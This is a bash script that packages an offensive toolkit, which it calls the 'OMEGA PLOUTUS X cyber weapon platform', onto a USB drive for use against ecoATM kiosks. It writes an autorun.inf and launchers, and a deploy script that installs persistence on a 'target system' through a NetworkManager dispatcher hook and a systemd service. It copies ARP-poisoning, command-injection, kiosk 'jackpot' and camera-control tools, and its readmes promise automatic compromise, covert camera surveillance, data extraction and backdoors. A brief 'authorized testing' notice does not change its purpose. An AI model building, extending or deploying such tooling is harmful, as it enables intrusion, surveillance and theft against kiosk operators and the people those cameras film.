#!/bin/bash
# OMEGA PLOUTUS X - USB Deployment Creator
# Creates a portable USB cyber weapon platform
# Run this script to deploy OMEGA to USB drive

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Logging
log() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $*"
}

error() {
    echo -e "${RED}[ERROR]${NC} $*" >&2
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $*"
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $*"
}

# Check root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (sudo)"
        exit 1
    fi
}

# Detect USB drives
detect_usb_drives() {
    log "🔍 Detecting USB drives..."

    # Find mounted USB drives
    usb_drives=()
    while IFS= read -r line; do
        if [[ $line =~ /dev/sd[a-z][0-9]* ]]; then
            mount_point=$(echo "$line" | awk '{print $2}')
            device=$(echo "$line" | awk '{print $1}')

            # Check if it's actually a USB drive
            if udevadm info -n "$device" | grep -q "ID_BUS=usb" 2>/dev/null; then
                usb_drives+=("$device:$mount_point")
            fi
        fi
    done < /proc/mounts

    if [[ ${#usb_drives[@]} -eq 0 ]]; then
        error "No USB drives detected!"
        echo -e "${YELLOW}Please insert a USB drive and mount it${NC}"
        echo -e "${YELLOW}Example: sudo mount /dev/sdb1 /mnt/usb${NC}"
        exit 1
    fi

    log "Found ${#usb_drives[@]} USB drive(s):"
    for i in "${!usb_drives[@]}"; do
        device=$(echo "${usb_drives[$i]}" | cut -d: -f1)
        mount_point=$(echo "${usb_drives[$i]}" | cut -d: -f2)
        size=$(df -h "$mount_point" | tail -1 | awk '{print $2}')
        available=$(df -h "$mount_point" | tail -1 | awk '{print $4}')
        echo "  [$i] $device -> $mount_point ($size total, $available available)"
    done
}

# Select USB drive
select_usb_drive() {
    if [[ ${#usb_drives[@]} -eq 1 ]]; then
        selected_drive="${usb_drives[0]}"
        log "Auto-selected only available USB drive"
    else
        echo -e "${CYAN}Select USB drive (0-${#usb_drives[@]}):${NC}"
        read -r selection

        if [[ ! $selection =~ ^[0-9]+$ ]] || [[ $selection -ge ${#usb_drives[@]} ]]; then
            error "Invalid selection"
            exit 1
        fi

        selected_drive="${usb_drives[$selection]}"
    fi

    USB_DEVICE=$(echo "$selected_drive" | cut -d: -f1)
    USB_MOUNT=$(echo "$selected_drive" | cut -d: -f2)

    # Verify mount point exists and is writable
    if [[ ! -d "$USB_MOUNT" ]]; then
        error "Mount point $USB_MOUNT does not exist"
        exit 1
    fi

    if [[ ! -w "$USB_MOUNT" ]]; then
        error "Mount point $USB_MOUNT is not writable"
        exit 1
    fi

    # Check available space (need at least 500MB)
    available_kb=$(df "$USB_MOUNT" | tail -1 | awk '{print $4}')
    available_mb=$((available_kb / 1024))

    if [[ $available_mb -lt 500 ]]; then
        error "Insufficient space on USB drive (${available_mb}MB available, need 500MB)"
        exit 1
    fi

    success "Selected USB drive: $USB_DEVICE -> $USB_MOUNT"
}

# Create USB deployment structure
create_usb_structure() {
    log "📁 Creating USB deployment structure..."

    # OMEGA directory on USB
    OMEGA_USB_DIR="$USB_MOUNT/OMEGA_PLOUTUS_X"
    mkdir -p "$OMEGA_USB_DIR"

    # Subdirectories
    mkdir -p "$OMEGA_USB_DIR/tools"
    mkdir -p "$OMEGA_USB_DIR/logs"
    mkdir -p "$OMEGA_USB_DIR/captures"
    mkdir -p "$OMEGA_USB_DIR/extracted"
    mkdir -p "$OMEGA_USB_DIR/backdoors"

    success "USB structure created at: $OMEGA_USB_DIR"
}

# Copy OMEGA files to USB
copy_omega_files() {
    log "📦 Copying OMEGA files to USB..."

    # Core OMEGA files
    local files_to_copy=(
        "omega_launcher.py"
        "auto_ecoATM_deploy.sh"
        "network_config.sh"
        "omega_kiosk_attack/kiosk_jackpot_launcher.py"
        "ecoATM/camera_control.py"
        "server_listener/omega_cli.py"
        "proxy_servers/badass_proxy_clean.py"
        "arp_poisoning_implementation.py"
        "command_injection_omega.py"
        "setup_environment.sh"
        "DEPLOYMENT_GUIDE.md"
        "README.md"
    )

    for file in "${files_to_copy[@]}"; do
        if [[ -f "$file" ]]; then
            cp "$file" "$OMEGA_USB_DIR/tools/"
            log "✅ Copied: $file"
        else
            warning "File not found: $file"
        fi
    done

    # Service files
    local service_files=(
        "omega_network_dispatcher"
        "omega_autostart.service"
        "install_autostart.sh"
    )

    for file in "${service_files[@]}"; do
        if [[ -f "$file" ]]; then
            cp "$file" "$OMEGA_USB_DIR/tools/"
            log "✅ Copied service file: $file"
        fi
    done

    success "OMEGA files copied to USB"
}

# Create USB launcher scripts
create_usb_launchers() {
    log "🚀 Creating USB launcher scripts..."

    # Main launcher for USB
    cat > "$OMEGA_USB_DIR/OMEGA_LAUNCHER.bat" << 'EOF'
@echo off
REM OMEGA PLOUTUS X - USB Launcher (Windows)
echo.
echo ========================================
echo    🔥 OMEGA PLOUTUS X - USB EDITION 🔥
echo ========================================
echo.

REM Check if running on Windows
ver | find "Windows" >nul
if %errorlevel% neq 0 (
    echo This launcher is for Windows. For Linux, use OMEGA_LAUNCHER.sh
    pause
    exit /b 1
)

echo Starting OMEGA PLOUTUS X...
echo.

REM Try Python 3 first, then Python
python omega_launcher.py %* 2>nul || python3 omega_launcher.py %* 2>nul || (
    echo ERROR: Python not found!
    echo Please install Python 3.8+ from https://python.org
    pause
    exit /b 1
)

echo.
echo OMEGA PLOUTUS X session ended.
pause
EOF

    # Linux launcher for USB
    cat > "$OMEGA_USB_DIR/OMEGA_LAUNCHER.sh" << 'EOF'
#!/bin/bash
# OMEGA PLOUTUS X - USB Launcher (Linux)

echo "========================================"
echo "   🔥 OMEGA PLOUTUS X - USB EDITION 🔥"
echo "========================================"
echo

# Check if Python is available
if ! command -v python3 &> /dev/null && ! command -v python &> /dev/null; then
    echo "ERROR: Python not found!"
    echo "Please install Python 3.8+"
    echo "Ubuntu/Debian: sudo apt install python3 python3-pip"
    exit 1
fi

echo "Starting OMEGA PLOUTUS X..."
echo

# Launch OMEGA
cd tools
python3 omega_launcher.py "$@" 2>/dev/null || python omega_launcher.py "$@" 2>/dev/null || {
    echo "ERROR: Failed to launch OMEGA"
    exit 1
}

echo
echo "OMEGA PLOUTUS X session ended."
EOF

    # Quick deployment script for USB
    cat > "$OMEGA_USB_DIR/DEPLOY_OMEGA.sh" << 'EOF'
#!/bin/bash
# OMEGA PLOUTUS X - Quick USB Deployment
# Run this on target system to install OMEGA

echo "🔥 OMEGA PLOUTUS X - USB DEPLOYMENT"
echo "=================================="
echo

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    echo "❌ Please run as root: sudo ./DEPLOY_OMEGA.sh"
    exit 1
fi

echo "🚀 Installing OMEGA PLOUTUS X..."

# Create installation directory
mkdir -p /opt/omega

# Copy all tools
cp -r tools/* /opt/omega/

# Make scripts executable
chmod +x /opt/omega/*.sh
chmod +x /opt/omega/*.py

# Install services (if on Linux with systemd)
if command -v systemctl &> /dev/null; then
    cp /opt/omega/omega_network_dispatcher /etc/NetworkManager/dispatcher.d/ 2>/dev/null && \
    chmod +x /etc/NetworkManager/dispatcher.d/omega_network_dispatcher 2>/dev/null && \
    echo "✅ NetworkManager dispatcher installed"

    cp /opt/omega/omega_autostart.service /etc/systemd/system/ 2>/dev/null && \
    systemctl daemon-reload 2>/dev/null && \
    systemctl enable omega-ecosystem 2>/dev/null && \
    echo "✅ Systemd service installed"
fi

echo
echo "✅ OMEGA PLOUTUS X INSTALLED!"
echo "📍 Location: /opt/omega/"
echo "🚀 Launch: python3 /opt/omega/omega_launcher.py"
echo "📹 Connect to ecoATM WiFi for auto-deployment!"
echo
echo "🌟 USB deployment complete!"
EOF

    # README for USB
    cat > "$OMEGA_USB_DIR/README_USB.txt" << 'EOF'
OMEGA PLOUTUS X - USB EDITION
=============================

This USB drive contains the complete OMEGA PLOUTUS X cyber weapon platform.

QUICK START:
-----------
1. Insert USB into target system
2. Run: OMEGA_LAUNCHER.bat (Windows) or OMEGA_LAUNCHER.sh (Linux)
3. Connect to ecoATM WiFi for automatic deployment
4. Watch live camera feeds open automatically

CONTENTS:
--------
/tools/          - Core OMEGA files
/logs/           - Operation logs
/captures/       - Camera captures
/extracted/      - Extracted data
/backdoors/      - Generated backdoors

LAUNCHERS:
---------
OMEGA_LAUNCHER.bat    - Windows launcher
OMEGA_LAUNCHER.sh     - Linux launcher
DEPLOY_OMEGA.sh       - Full system installation

FEATURES:
--------
- Automatic ecoATM WiFi detection
- Live camera surveillance
- Source code extraction
- Real-time monitoring
- Cross-platform compatibility
- Professional interface

SECURITY:
--------
- Encrypted communications
- Secure data handling
- No permanent installation required
- Portable and stealthy

For full documentation, see: tools/DEPLOYMENT_GUIDE.md

OMEGA PLOUTUS X - The Ultimate Cyber Weapon Platform
====================================================
EOF

    # Make scripts executable
    chmod +x "$OMEGA_USB_DIR/OMEGA_LAUNCHER.sh"
    chmod +x "$OMEGA_USB_DIR/DEPLOY_OMEGA.sh"

    success "USB launcher scripts created"
}

# Create portable Python environment
create_portable_python() {
    log "🐍 Creating portable Python environment..."

    # Check if we can create a portable Python
    if command -v python3 &> /dev/null; then
        # Create requirements file
        cat > "$OMEGA_USB_DIR/requirements.txt" << 'EOF'
paramiko>=3.0.0
scapy>=2.5.0
requests>=2.28.0
cryptography>=41.0.0
pycryptodome>=3.18.0
colorama>=0.4.6
termcolor>=2.3.0
tqdm>=4.65.0
tabulate>=0.9.0
pyyaml>=6.0
jinja2>=3.1.0
EOF

        log "Created requirements.txt for portable Python"
    else
        warning "Python not available for portable environment"
    fi
}

# Create bootable option (optional)
create_bootable_option() {
    log "💿 Creating bootable USB option..."

    read -p "Make USB bootable with OMEGA? (y/N): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        warning "Bootable USB creation requires additional setup"
        info "Consider using tools like Rufus (Windows) or dd (Linux) for bootable USB"
        info "OMEGA can be run portably without bootable option"
    fi
}

# Finalize USB deployment
finalize_usb() {
    log "🎯 Finalizing USB deployment..."

    # Create autorun.inf for Windows (optional)
    cat > "$USB_MOUNT/autorun.inf" << 'EOF'
[autorun]
open=OMEGA_PLOUTUS_X\OMEGA_LAUNCHER.bat
icon=OMEGA_PLOUTUS_X\tools\omega_launcher.py,0
label=OMEGA PLOUTUS X - Cyber Weapon Platform
EOF

    # Display disk usage
    usb_usage=$(df -h "$USB_MOUNT" | tail -1)
    log "USB disk usage: $usb_usage"

    # Create deployment summary
    cat > "$OMEGA_USB_DIR/DEPLOYMENT_INFO.txt" << EOF
OMEGA PLOUTUS X - USB DEPLOYMENT INFO
====================================

Deployment Date: $(date)
Source System: $(hostname)
USB Device: $USB_DEVICE
Mount Point: $USB_MOUNT
OMEGA Location: $OMEGA_USB_DIR

CONTENTS:
- Core OMEGA framework
- Camera control modules
- Network exploitation tools
- Live streaming capabilities
- Auto-deployment scripts
- Cross-platform launchers

SYSTEM REQUIREMENTS:
- Python 3.8+
- Network connectivity
- Camera access (optional)

DEPLOYMENT INSTRUCTIONS:
1. Insert USB into target system
2. Run OMEGA_LAUNCHER.bat (Windows) or OMEGA_LAUNCHER.sh (Linux)
3. Connect to ecoATM WiFi for automatic compromise
4. Monitor live camera feeds on Windows system

SECURITY NOTES:
- All operations logged to /logs/
- Captured data stored in /captures/
- No permanent system modifications required
- Portable and stealthy operation

For technical details, see: tools/DEPLOYMENT_GUIDE.md

OMEGA PLOUTUS X - Portable Cyber Weapon Platform
===============================================
EOF

    success "USB deployment finalized"
}

# Main deployment function
main() {
    echo -e "${PURPLE}🔥 OMEGA PLOUTUS X - USB DEPLOYMENT CREATOR${NC}"
    echo -e "${PURPLE}=============================================${NC}"
    echo

    check_root
    detect_usb_drives
    select_usb_drive
    create_usb_structure
    copy_omega_files
    create_usb_launchers
    create_portable_python
    create_bootable_option
    finalize_usb

    echo
    echo -e "${PURPLE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${NC}              ${RED}🔥 USB DEPLOYMENT COMPLETE 🔥${NC}               ${PURPLE}║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${CYAN}📁 OMEGA Location:${NC} $OMEGA_USB_DIR"
    echo -e "${CYAN}💿 USB Device:${NC} $USB_DEVICE"
    echo -e "${CYAN}🎯 Launchers:${NC} OMEGA_LAUNCHER.bat / OMEGA_LAUNCHER.sh"
    echo
    echo -e "${GREEN}🚀 READY FOR DEPLOYMENT:${NC}"
    echo "  • Insert USB into target system"
    echo "  • Run appropriate launcher for OS"
    echo "  • Connect to ecoATM WiFi"
    echo "  • Watch automatic compromise!"
    echo
    echo -e "${YELLOW}📋 Files Created:${NC}"
    echo "  • OMEGA_LAUNCHER.bat (Windows)"
    echo "  • OMEGA_LAUNCHER.sh (Linux)"
    echo "  • DEPLOY_OMEGA.sh (Installation)"
    echo "  • README_USB.txt (Documentation)"
    echo "  • DEPLOYMENT_INFO.txt (Details)"
    echo
    echo -e "${RED}⚠️  LEGAL NOTICE:${NC}"
    echo "  Use only for authorized security testing"
    echo "  Comply with all applicable laws and regulations"
    echo
    echo -e "${PURPLE}🌟 OMEGA PLOUTUS X - PORTABLE CYBER WEAPON READY!${NC}"
}

# Run main deployment
main "$@"
